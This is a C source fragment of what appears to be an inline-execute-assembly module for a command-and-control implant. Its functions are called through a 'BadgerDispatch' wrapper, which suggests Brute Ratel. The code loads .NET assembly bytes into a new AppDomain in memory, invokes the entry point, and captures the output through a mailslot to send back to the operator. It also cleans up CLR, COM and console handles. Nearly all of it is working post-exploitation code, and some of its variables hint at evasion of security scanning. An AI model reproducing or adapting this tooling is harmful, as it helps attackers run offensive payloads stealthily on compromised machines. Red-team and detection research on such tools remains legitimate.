            BadgerDispatch(gdispatch,"[*] AppDomain created succesfully\n");
#endif
        }
        else{
            BadgerDispatch(gdispatch,"[-] QueryInterface failed. hr = %d\n",hr);
            goto CLEANUP;
        }
    }
    else{
        BadgerDispatch(gdispatch,"[-] CreateDomain failed. hr = %d\n",hr);
        goto CLEANUP;
    }

    //Prep SafeArray
    rgsabound[0].cElements = assemblyBytesLen;
    rgsabound[0].lLbound = 0;
    SAFEARRAY* pSafeArray = OLEAUT32$SafeArrayCreate(VT_UI1, 1, rgsabound);
#ifdef DEBUG
    BadgerDispatch(gdispatch,"[*] pSafeArray = 0x%p\n", pSafeArray);
#endif
    if(pSafeArray == NULL){
        BadgerDispatch(gdispatch,"[-] SafeArrayCreate failed\n");
        goto CLEANUP;
    }
    void* pvData = NULL;
    hr = OLEAUT32$SafeArrayAccessData(pSafeArray, &pvData);
    if(hr != S_OK || pvData == NULL){
        BadgerDispatch(gdispatch,"[-] SafeArrayAccessData failed with error = 0x%d. PvData = 0x%p\n",KERNEL32$GetLastError(),pvData);
        goto CLEANUP;
    }
#ifdef DEBUG
    BadgerDispatch(gdispatch,"[*] pvData = 0x%p\n",pvData);
#endif
    //Copy our assembly bytes to pvData
    MSVCRT$memcpy(pvData, assemblyBytes, assemblyBytesLen);

    hr = OLEAUT32$SafeArrayUnaccessData(pSafeArray);
    if(hr != S_OK){
        BadgerDispatch(gdispatch,"[-] SafeArrayUnaccessData failed with error = 0x%d\n",KERNEL32$GetLastError());
        goto CLEANUP;
    }
    //Prep AppDomain and EntryPoint
    hr = pAppDomain->lpVtbl->Load_3(pAppDomain, pSafeArray, &pAssembly);
    if (hr != S_OK) {
        //If AppDomain fails to load fail gracefully
        BadgerDispatch(gdispatch , "[-] Process refusing to load AppDomain of %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", wNetVersion);
        //MSVCRT$free(assemblyArguments);
        goto CLEANUP;
    }
#ifdef DEBUG
    BadgerDispatch(gdispatch,"[*] Assembly loaded successfully\n");
#endif
    hr = pAssembly->lpVtbl->EntryPoint(pAssembly, &pMethodInfo);
    if (hr != S_OK) {
        //If EntryPoint fails to load fail gracefully
        BadgerDispatch(gdispatch , "[-] Process refusing to find entry point of assembly.\n");
        //MSVCRT$free(assemblyArguments);
        goto CLEANUP;
    }
#ifdef DEBUG
    BadgerDispatch(gdispatch,"[*] Assembly entrypoint retrived. pMethodInfo = 0x%p\n",pMethodInfo);
#endif
    MSVCRT$memset(&retVal, 0x0,sizeof(VARIANT));
    MSVCRT$memset(&obj, 0x0,sizeof(VARIANT));
    obj.vt = VT_NULL;

    //Change cElement to the number of Main arguments
    SAFEARRAY* psaStaticMethodArgs = OLEAUT32$SafeArrayCreateVector(VT_VARIANT, 0, (ULONG)entryPoint);//Last field -> entryPoint == 1 is needed if Main(String[] args) 0 if Main()

    //Insert an array of BSTR into the VT_VARIANT psaStaticMethodArgs array
    long idx[1] = { 0 };
    OLEAUT32$SafeArrayPutElement(psaStaticMethodArgs, idx, &vtPsa);

    //Invoke our .NET Method
    hr = pMethodInfo->lpVtbl->Invoke_3(pMethodInfo, obj, psaStaticMethodArgs, &retVal);
    if(hr != S_OK){
        BadgerDispatch(gdispatch,"[-] Invoke_3 failed with error %d\n",hr);
        goto CLEANUP;
    }
#ifdef DEBUG
    BadgerDispatch(gdispatch,"[*] Invoke_3 returned successfully\n");
#endif
    //Read from our mailslot
    success = ReadSlot(returnData, &mainHandle);
    //Send .NET assembly output back to CS
    if(success)
        BadgerDispatch(gdispatch, "\n%s\n", returnData);
    //Close handles
    //_CloseHandle CloseHandle = (_CloseHandle) GetProcAddress(GetModuleHandleA("kernel32.dll"), "CloseHandle");
    CLEANUP:
    //Revert stdout back to original handles
    success = KERNEL32$SetStdHandle(((DWORD)-11), stdOutput);
    success = KERNEL32$SetStdHandle(((DWORD)-12), stdError);

    if(hFile != INVALID_HANDLE_VALUE && hFile != NULL ){
        KERNEL32$CloseHandle(hFile);
        hFile = INVALID_HANDLE_VALUE;
    }
    if(mainHandle != INVALID_HANDLE_VALUE && mainHandle != NULL) {
        KERNEL32$CloseHandle(mainHandle);
        mainHandle = INVALID_HANDLE_VALUE;
    }
    //Clean up
    OLEAUT32$SafeArrayDestroy(pSafeArray);
    OLEAUT32$VariantClear(&retVal);
    OLEAUT32$VariantClear(&obj);
    OLEAUT32$VariantClear(&vtPsa);

    if (NULL != psaStaticMethodArgs) {
        OLEAUT32$SafeArrayDestroy(psaStaticMethodArgs);
        psaStaticMethodArgs = NULL;
    }
    if (pMethodInfo != NULL) {

        pMethodInfo->lpVtbl->Release(pMethodInfo);
        pMethodInfo = NULL;
    }
    if (pAssembly != NULL) {

        pAssembly->lpVtbl->Release(pAssembly);
        pAssembly = NULL;
    }
    if (pAppDomain != NULL) {

        pAppDomain->lpVtbl->Release(pAppDomain);
        pAppDomain = NULL;
    }
    if (pAppDomainThunk != NULL) {

        pAppDomainThunk->lpVtbl->Release(pAppDomainThunk);
    }
    if (pICorRuntimeHost != NULL)
    {
        (pICorRuntimeHost)->lpVtbl->UnloadDomain(pICorRuntimeHost, pAppDomainThunk);
        (pICorRuntimeHost) = NULL;
    }
    if (pClrRuntimeInfo != NULL)
    {
        (pClrRuntimeInfo)->lpVtbl->Release(pClrRuntimeInfo);
        (pClrRuntimeInfo) = NULL;
    }
    if (pClrMetaHost != NULL)
    {
        (pClrMetaHost)->lpVtbl->Release(pClrMetaHost);
        (pClrMetaHost) = NULL;
    }
    if(assemblyArguments != NULL){
        MSVCRT$free(assemblyArguments);
        assemblyArguments = NULL;
    }
    if(toEncode != NULL){
        MSVCRT$free(toEncode);
        toEncode = NULL;
    }
    if(slotPath != NULL){
        MSVCRT$free(slotPath);
        slotPath = NULL;
    }
    if(returnData != NULL){
        MSVCRT$free(returnData);
        returnData = NULL;
    }
    if(ps_script_b64 != NULL){
        MSVCRT$free(ps_script_b64);
        ps_script_b64 = NULL;
    }
    //HwBpEngineDestroy(NULL);
    if(ghMutex!= INVALID_HANDLE_VALUE)
        KERNEL32$CloseHandle(ghMutex);
    //Free console only if we attached one
    if (frConsole != 0) {
        //_FreeConsole FreeConsole = (_FreeConsole) GetProcAddress(GetModuleHandleA("kernel32.dll"), "FreeConsole");
        success = KERNEL32$FreeConsole();
    }

#ifdef DEBUG
    BadgerDispatch(gdispatch, "[+] inlineExecute-Assembly Finished\n");
#endif
}